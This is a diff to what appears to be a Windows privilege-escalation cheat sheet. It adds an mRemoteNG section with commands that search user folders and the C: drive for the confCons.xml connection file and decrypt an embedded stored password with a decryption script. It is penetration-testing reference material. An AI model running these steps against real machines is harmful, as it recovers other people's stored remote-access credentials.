@@ -374,6 +374,12 @@ autorunsc.exe -m -nobanner -a * -ct /accepteula
 wmic product get name
 Look for the Nday exploits for each service
 ```
+### Vulnerable Applications
+###### mRemoteNG
+```
+dir %USERPROFILE%\APPDATA\Roaming\mRemoteNG or where /R C:\ confCons.xml
+python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
+```
 ### Service DLL Hijacking
 >The following is the default search order with SafeDllSearchMode enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode registry value and set it to 0 (default is enabled).
 ```
